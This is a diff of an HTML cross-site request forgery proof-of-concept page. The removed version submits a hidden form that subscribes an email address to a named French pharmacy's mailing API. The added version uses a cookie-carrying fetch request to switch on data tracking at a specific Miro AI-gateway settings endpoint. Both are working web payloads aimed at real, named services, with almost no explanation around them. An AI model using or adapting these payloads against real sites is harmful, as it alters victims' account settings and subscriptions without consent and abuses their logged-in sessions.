@@ -1,33 +1,27 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Pure HTML CSRF PoC - Mailing Subscription</title>
-  <style>
-    iframe {
-      width: 100%;
-      height: 200px;
-      border: 1px solid #ccc;
-      margin-top: 15px;
-    }
-  </style>
-</head>
-<body>
-  <h2>Pure HTML CSRF PoC - Subscribe to Newsletter</h2>
+<html>
+  <body>
+    <h2>CSRF PoC</h2>
+    <form id="csrfForm" method="POST" action="https://svc.eu01.miro.com/api/ai-gateway/data-tracking-settings/update/3458764633775730812" enctype="text/plain">
+      <button type="button" onclick="sendCSRF()">Click to Submit CSRF</button>
+    </form>
 
-  <form 
-    action="https://www.redcare-pharmacie.fr/homeone/api/bully/mailing-subscription/v1/fr/subscriptions" 
-    method="POST" 
-    target="responseFrame"
-  >
-    <input type="hidden" name="email" value="noyono010101@gmail.com">
-    <input type="hidden" name="newsletterType" value="general">
-    <input type="hidden" name="consent" value="true">
+    <script>
+      function sendCSRF() {
+        const data = JSON.stringify({ dataTrackingEnabled: true });
 
-    <input type="submit" value="Subscribe via CSRF">
-  </form>
-
-  <h3>Server Response (if visible):</h3>
-  <iframe name="responseFrame"></iframe>
-</body>
+        fetch("https://svc.eu01.miro.com/api/ai-gateway/data-tracking-settings/update/3458764633775730812", {
+          method: "POST",
+          mode: "cors",
+          credentials: "include", // Important to send cookies
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: data
+        })
+        .then(res => alert("CSRF Request sent!"))
+        .catch(err => alert("Failed: " + err));
+      }
+    </script>
+  </body>
 </html>
